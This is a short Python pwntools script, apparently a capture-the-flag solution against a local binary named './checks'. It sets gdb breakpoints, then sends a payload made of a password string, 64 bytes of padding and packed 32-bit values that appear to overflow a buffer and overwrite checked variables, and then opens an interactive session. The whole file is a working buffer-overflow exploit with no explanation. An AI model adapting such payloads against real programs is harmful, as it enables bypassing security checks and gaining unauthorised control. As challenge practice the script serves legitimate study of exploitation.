from pwn import *

exe = "./checks"

def start(argv=[], *a, **kw):
    return gdb.debug([exe] + argv, gdbscript=gdbscripts, *a, **kw)

gdbscripts = '''
b* 0x0000000000401235
b* 0x000000000040123f
b* 0x0000000000401245
b* 0x000000000040124e
b* 0x0000000000401254
r
'''.format(**locals())
r = process("./checks")
payload = flat(['password123\x00', 'a'*64, p32(0x11), p32(0x3d), p32(0xf5), p32(0x37), p32(0x32)])
r.recvuntil(":")
r.sendline(payload)
r.interactive()